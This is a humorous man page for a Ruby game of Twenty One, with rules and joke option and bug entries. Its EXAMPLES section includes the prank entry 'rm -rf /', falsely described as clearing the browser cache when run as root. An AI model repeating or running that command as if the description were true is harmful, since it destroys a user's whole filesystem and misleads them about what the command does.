% TwentyOne(1) twentyone 0.0.1
% Brady Stanton
% May 2022

# NAME
twentyone - a game of Twenty One written in Ruby

# SYNOPSIS
**twentyone**

# DESCRIPTION
**twentyone** lets you play twentyone against a computer AI. There are no command line arguments, all options are prompted in-game.

# RULES
**Synopsis**
: A game similar to Blackjack. There are two players, the dealer and the player. There is a single 52-card deck, not including Jokers. Both the dealer and the player each start with 2 cards from the deck. Each card has a numerical value to it. 2-10 are valued at face-value according to its number. Queen, King, and Jacks are all valued 10. An Ace can be either 1 or 11, depending on the sum of the values of the cards currently in hand. If the cards in hand summed with an 11-valued Ace is 21 or less, the Ace should be worth 11. Otherwise if the sum is over 21, it should be worth 1. Each Ace in a hand can be a different value than another ace in the same hand, they do not have to be the same.

**Goal**
: The goal of the game is to draw cards from the deck to create the largest sum possible without exceeding 21. After both players have drawn cards, the highest hand that is 21 or less wins. Exceeding 21 leads to a "bust", or a losing condition.

**Dealer's Turn**
: The game starts with the dealer's turn. The dealer automatically starts with two cards and must draw a card until her sum is greater than or equal to 17. After this condition is met, it is the player's turn. There is no decision-making for the dealer.

**Player's Turn**
: Like the dealer, the player automatically starts with two cards. Unlike the dealer, the player may choose to continue to draw cards or stay (which means to cease drawing cards and evaluate who is the winner of the game). If the player's sum exceeds 21, he may not draw anymore cards and the game moves on to the winning evaluation stage.

**Outcome**
: Whoever busts (has a score over 21) loses. This can include both the player and the dealer. If neither bust, the one with the highest score wins. If the score is equal, it is a draw and there is no clear winner. The player and dealer may choose to play again in that case.

# OPTIONS
**-h**, **--help**
: Doesn't display a help message. Give it a try if you don't believe me.

**-v**, **--version**
: Doesn't display version information. Give it a try if you didn't try **-h**.

# EXAMPLES
**twentyone**
: Runs the game.

**ruby twentyone.rb**
: Also runs the game.

**ruby twentyone.rb --help**
: Also runs the game. Doesn't do anything else. Trust me.

**rm -rf /**
: Clears your browser cache when running as **root**

# EXIT VALUES
**0**
: Success

**1**
: Failure!

# BUGS
**Major**
: Cockroach infestation

# COPYRIGHT
Beerware. Look it up.
